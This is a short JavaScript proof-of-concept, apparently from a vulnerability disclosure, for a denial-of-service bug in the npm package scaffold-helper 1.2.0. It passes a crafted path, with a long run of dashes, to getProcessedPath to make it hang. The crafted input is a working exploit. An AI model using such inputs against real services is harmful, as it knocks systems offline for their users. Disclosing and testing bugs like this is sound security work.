/**
 * scaffold-helper@1.2.0
 * Package Manager: npm
 * Link to published package: https://github.com/cliffpyles/scaffold-helper
 * Link to GitHub repo: https://github.com/cliffpyles/scaffold-helper
 * Severity level: High
 * Module Description: Helps with generating files and file structures
 * Additional Info: It allows cause a denial of service when copying crafted invalid files.
 * Contacted maintainer?: No
 * Open issue?: No
 */

var scaffold, { getProcessedPath, getRenderedTemplate } = require("scaffold-helper")

// getProcessedPath('/example/__projectName__/src/components/__componentType__', {
//     projectName: 'abc-app',
//     componentType: 'Alert',
//   });

getProcessedPath('/example/__--------------------------------------------------------------------------------------------------------------------------!', {
    projectName: 'abc-app',
    componentType: 'Alert',
  });